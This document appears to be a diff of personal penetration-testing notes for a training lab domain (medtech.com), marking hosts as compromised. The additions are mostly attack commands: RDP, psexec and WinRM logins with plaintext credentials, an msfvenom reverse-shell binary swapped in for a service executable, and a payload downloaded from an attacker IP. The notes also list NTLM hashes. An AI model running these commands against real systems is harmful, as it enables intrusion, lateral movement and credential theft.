@@ -42,10 +42,9 @@ Host script results:
 |_    Message signing enabled and required
 |_clock-skew: -9s
 
-
 ```
 
-# VM 2
+# VM 2 (pwned)
 - files02.medtech.com
 ```
 PORT      STATE SERVICE       VERSION
@@ -99,6 +98,7 @@ Host script results:
     87139 Oct 04 11:21  Backup      goomba                       6872 Backup Completed. NTLM: 8e9e1516818ce4e54247e71e71b5f436
 
 ```
+
 # VM 6
 - dev04.medtech.com
 ```
@@ -134,6 +134,20 @@ Host script results:
 49670/tcp open  unknown
 49671/tcp open  unknown
 ```
+## FootHold
+    ```
+        xfreerdp /v:172.16.155.12 /u:yoshi /p:Mushroom\! /cert-ignore
+    ```
+## Root
+- Replace c:\temp\backup.exe to rev shell
+    ```
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.184 LPORT=80 -f exe > backup.exe
+        nc -lvnp 80
+    ```
+## Interesting Info
+1. leon logined 
+    ```
+    ```
 
 # VM 7
 - prod01.medtech.com
@@ -166,7 +180,7 @@ PORT      STATE SERVICE       VERSION
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-# VM 9
+# VM 9 (pwned)
 - client01.medtech.com
 ```
 135/tcp   open  msrpc         Microsoft Windows RPC
@@ -207,8 +221,22 @@ Host script results:
 |_clock-skew: mean: -10s, deviation: 0s, median: -10s
 |_nbstat: NetBIOS name: CLIENT01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:92:cd (VMware)
 ```
+## FoldHold & Root
+- Found yoshi is sharing same password with wario... (dafuq?)
+  ```
+  impacket-psexec medtech.com/yoshi:Mushroom\!@172.16.155.82
+  ```
+- rdp-able
+    ```
+    xfreerdp /v:172.16.155.82 /u:yoshi /p:Mushroom\! /d:medtech.com /cert-ignore
+    ```
 
-# VM 10
+## Interesting info
+```
+    Medtech\Administrator : 43ef2da7af4764456e2156f04d48eebe (hash)
+```
+
+# VM 10 (pwned)
 - client02.medtech.com
 ```
 PORT      STATE SERVICE       VERSION
@@ -242,19 +270,6 @@ Host script results:
 |_nbstat: NetBIOS name: CLIENT02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:7d:47 (VMware)
 ```
 
-```
-SMB         172.16.184.83   445    CLIENT02         [*] Windows 10.0 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
-SMB         172.16.184.83   445    CLIENT02         [+] medtech.com\joe:Flowers1 
-SMB         172.16.184.83   445    CLIENT02         [+] Enumerated shares
-SMB         172.16.184.83   445    CLIENT02         Share           Permissions     Remark
-SMB         172.16.184.83   445    CLIENT02         -----           -----------     ------
-SMB         172.16.184.83   445    CLIENT02         ADMIN$                          Remote Admin
-SMB         172.16.184.83   445    CLIENT02         C               READ            
-SMB         172.16.184.83   445    CLIENT02         C$                              Default share
-SMB         172.16.184.83   445    CLIENT02         IPC$            READ            Remote IPC
-SMB         172.16.184.83   445    CLIENT02         Windows         READ            
-                                                                                        
-```
 ## FootHold
 1. ``` 
     evil-winrm -i 172.16.201.83 -u 'medtech.com\wario' -p 'Mushroom!' 
@@ -264,5 +279,5 @@ SMB         172.16.184.83   445    CLIENT02         Windows         READ
 1.  ```
     cd C:\DevelopmentExecutables
     iwr -uri http://192.168.45.226/auditTracker.exe -Outfile auditTracker.exe 
-    Restart-Service auditTracker.exe -Force 
+    Restart-Service auditTracker -Force 
     ```
